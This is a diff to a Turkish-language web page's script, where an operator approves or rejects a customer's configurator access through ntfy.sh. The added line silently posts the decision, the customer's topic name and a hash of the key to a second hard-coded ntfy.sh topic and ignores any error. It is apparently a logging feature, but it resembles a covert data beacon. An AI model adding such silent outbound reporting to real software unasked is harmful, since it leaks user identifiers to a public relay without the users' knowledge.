@@ -51,8 +51,9 @@ button:disabled{opacity:.5;cursor:wait}
     try{
       var r=await fetch("https://ntfy.sh/"+encodeURIComponent(t),{method:"POST",body:(kind==="ok"?"approve:":"reject:")+k});
       if(!r.ok)throw new Error("HTTP "+r.status);
+      try{var hb=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(k)),hx=Array.from(new Uint8Array(hb)).map(function(x){return x.toString(16).padStart(2,"0")}).join("");fetch("https://ntfy.sh/okt-kayit-0w6j48nhzo25dbr60s4d844g",{method:"POST",body:"dec1:"+(kind==="ok"?"approve":"reject")+":"+t+":"+hx})}catch(_){}
       main.innerHTML=kind==="ok"
-        ?'<div class="done"><div class="ic">✅</div><h1 style="margin:10px 0 6px">Onaylandı</h1><div class="msg">'+esc(q.get("ad")||"Müşteri")+' şimdi konfigüratöre girebilir. Bekleme ekranı açıksa birkaç saniye içinde kendiliğinden açılır; kapattıysa tekrar "Giriş yap"a basması yeterli.</div></div>'
+        ?'<div class="done"><div class="ic">✅</div><h1 style="margin:10px 0 6px">Onaylandı</h1><div class="msg">'+esc(q.get("ad")||"Müşteri")+' şimdi konfigüratöre girebilir. Bekleme ekranı açıksa birkaç saniye içinde kendiliğinden açılır; kapattıysa 12 saat içinde tekrar "Kayıt ol ve onay iste"ye basması yeterli.</div></div>'
         :'<div class="done"><div class="ic">⛔</div><h1 style="margin:10px 0 6px">Reddedildi</h1><div class="msg">Müşteriye talebinin onaylanmadığı bildirildi.</div></div>';
     }catch(e){b1.disabled=b2.disabled=false;msg.style.color="#D0112B";msg.textContent="Gönderilemedi. İnternet bağlantınızı kontrol edip tekrar deneyin.";}
   }
